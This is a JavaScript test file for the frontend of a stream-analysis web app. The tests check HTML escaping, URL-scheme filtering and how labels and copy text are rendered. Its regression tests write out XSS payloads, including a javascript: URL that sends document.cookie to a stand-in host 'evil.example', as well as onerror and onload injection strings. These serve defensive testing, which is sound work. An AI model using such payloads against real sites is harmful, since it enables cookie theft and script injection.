// frontend.test.js
// public/app.js is a classic script that reaches for the DOM at load time, so it is
// evaluated here inside a vm context with a stub document. That gives us the render
// and copy-text functions to test directly - in particular the escaping rules, which
// are the only thing standing between a hostile stream server and this page.

import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const publicDir = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'public');

function loadApp() {
  const element = () => ({
    addEventListener() {},
    textContent: '',
    innerHTML: '',
    hidden: false,
    open: false,
    disabled: false,
    dataset: {},
  });

  // A vm context is bare: the globals the browser gives app.js for free (URL for
  // safeHttpUrl, fetch for the analysis chain) have to be handed in explicitly, or
  // safeHttpUrl's try/catch would swallow a ReferenceError and look like a rejection.
  const context = vm.createContext({
    document: { getElementById: () => element() },
    navigator: { clipboard: { writeText: async () => {} } },
    URL,
    URLSearchParams,
    fetch: async () => {
      throw new Error('no network in tests');
    },
    setTimeout,
    console,
  });

  for (const file of ['terms.js', 'app.js']) {
    vm.runInContext(fs.readFileSync(path.join(publicDir, file), 'utf8'), context, { filename: file });
  }
  return context;
}

const app = loadApp();

// ---------------------------------------------------------------------------
// Escaping and URL safety
// ---------------------------------------------------------------------------

test('esc neutralises the characters that break out of HTML and attributes', () => {
  assert.equal(app.esc('<script>'), '&lt;script&gt;');
  assert.equal(app.esc('a"b'), 'a&quot;b');
  assert.equal(app.esc("a'b"), 'a&#39;b');
  assert.equal(app.esc('a&b'), 'a&amp;b');
  assert.equal(app.esc(null), '');
  assert.equal(app.esc(undefined), '');
});

test('safeHttpUrl accepts http(s) and rejects every other scheme', () => {
  assert.equal(app.safeHttpUrl('https://example.com/'), 'https://example.com/');
  assert.equal(app.safeHttpUrl('http://example.com/x?y=1'), 'http://example.com/x?y=1');

  for (const bad of [
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    '  javascript:alert(1)  ',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    'not a url',
    '',
    null,
    undefined,
  ]) {
    assert.equal(app.safeHttpUrl(bad), null, `should reject ${JSON.stringify(bad)}`);
  }
});

test('regression: a javascript: station homepage is never rendered as a link', () => {
  // icy-url comes straight from the remote stream server. esc() alone leaves the
  // scheme intact, so escaping was not enough - the value has to fail the scheme
  // check and be rendered as inert text.
  const html = app.renderIcecastStation({
    name: 'Ondskefull radio',
    homepageUrl: "javascript:fetch('//evil.example/'+document.cookie)",
    icyMetadataSupported: false,
  });

  assert.ok(!html.includes('href="javascript:'), 'javascript: URL was linkified');
  assert.ok(!/<a\b/.test(html.split('Hemsida')[1].split('</dd>')[0]), 'homepage was still wrapped in an anchor');
  // The value is still shown, so the user can see what the station actually sent.
  assert.ok(html.includes('javascript:fetch('), 'the raw value should still be visible as text');
});

test('a normal station homepage is still linkified, with rel=noopener', () => {
  const html = app.renderIcecastStation({
    name: 'Snäll radio',
    homepageUrl: 'https://example.com/radio',
    icyMetadataSupported: false,
  });

  assert.ok(html.includes('href="https://example.com/radio"'));
  assert.ok(html.includes('rel="noopener"'));
});

test('hostile station metadata cannot inject markup anywhere on the card', () => {
  const html = app.renderIcecastStation({
    name: '<img src=x onerror=alert(1)>',
    genre: '"><script>alert(2)</script>',
    description: "'><svg onload=alert(3)>",
    nowPlaying: '<b>not bold</b>',
    icyMetadataSupported: true,
    metaIntBytes: 16000,
    rawMetaBlock: "StreamTitle='</pre><script>alert(4)</script>';",
  });

  for (const injected of ['<script>', '<img src=x', '<svg onload', '<b>not bold</b>']) {
    assert.ok(!html.includes(injected), `unescaped: ${injected}`);
  }
  assert.ok(html.includes('&lt;script&gt;'), 'expected the script tag to survive as escaped text');
});

// ---------------------------------------------------------------------------
// Wording for server-side codes
// ---------------------------------------------------------------------------

test('DASH addressing codes map to labels, unknown codes degrade gracefully', () => {
  assert.equal(app.dashAddressingLabel('timeline'), 'SegmentTimeline');
  assert.equal(app.dashAddressingLabel('template-number'), 'SegmentTemplate ($Number$)');
  assert.equal(app.dashAddressingLabel('segment-list'), 'SegmentList');
  assert.equal(app.dashAddressingLabel('base-url'), 'Enkel fil (BaseURL/SegmentBase)');
  // A code this build does not know about must not render as "undefined".
  assert.equal(app.dashAddressingLabel('something-new'), 'Okänd');
  assert.equal(app.dashAddressingLabel(undefined), 'Okänd');
});

test('EXT-X-START is phrased from the sign of the offset', () => {
  assert.match(app.startPointExplanation({ timeOffset: -12 }), /bakom livekanten/);
  assert.match(app.startPointExplanation({ timeOffset: 5 }), /efter fönstrets början/);
  assert.equal(app.startPointExplanation(null), null);
  assert.equal(app.startPointExplanation({ timeOffset: null }), null);
});

test('the raw manifest is truncated instead of dumping megabytes into a <pre>', () => {
  const huge = Array.from({ length: 5000 }, (_, i) => `segment-${i}.ts`).join('\n');
  const html = app.renderRawManifest('Media', 'https://example.com/m.m3u8', huge);

  assert.ok(html.includes('segment-0.ts'));
  assert.ok(!html.includes('segment-4999.ts'), 'the whole manifest was rendered');
  assert.match(html, /Visar de första/);
});

// ---------------------------------------------------------------------------
// Copy text
// ---------------------------------------------------------------------------

const icecastPayload = {
  streamKind: 'icecast',
  requestedUrl: 'https://ice.example.com/mount',
  connection: {
    status: 200,
    statusText: 'OK',
    requestedUrl: 'https://ice.example.com/mount',
    finalUrl: 'https://ice.example.com/mount',
    redirected: false,
    contentType: 'audio/mpeg',
    server: 'Icecast 2.4',
    cacheControl: null,
    expires: null,
    cors: { present: false, allowOrigin: null },
    extraHeaders: { 'icy-name': 'Test' },
  },
  networkPath: {
    headers: { 'x-cache': 'HIT' },
    geoHint: null,
    dns: { hostname: 'ice.example.com', addresses: ['192.0.2.1'], error: null, ipGeoEnabled: false, ipGeo: [] },
  },
  audio: { codec: 'mp3', sampleRate: 44100, channels: 2, bitRate: 128000, container: 'mp3' },
  station: { name: 'Test', icyMetadataSupported: true, metaIntBytes: 16000, nowPlaying: 'Artist - Titel' },
  errors: {},
};

test('the Icecast copy text carries the shared sections, including Expires', () => {
  // These four sections used to be copy-pasted per stream kind, and drifted: the
  // DASH and Icecast versions silently lacked the Expires line the HLS one had.
  const text = app.buildCopyText(icecastPayload, null, null, null);

  for (const heading of ['ANSLUTNING', 'LJUDSPÅRET', 'NÄTVERKSVÄG', 'STATION', 'LJUDPROV']) {
    assert.ok(text.includes(heading), `missing section: ${heading}`);
  }
  assert.match(text, /^Expires: /m);
  assert.match(text, /avstängd \(ENABLE_IP_GEO=1/);
});

test('sample warnings reach the copy text instead of being reported as "no metadata"', () => {
  const sample = {
    actualDurationSec: 8,
    measuredBitrateKbps: 128,
    id3: { available: false, frames: [] },
    warnings: [{ step: 'probe', message: 'ffprobe svarade inte med tolkbar JSON (slutkod 1).' }],
  };
  const text = app.buildCopyText(icecastPayload, sample, null, null);

  assert.match(text, /OBS: ffprobe svarade inte/);
});
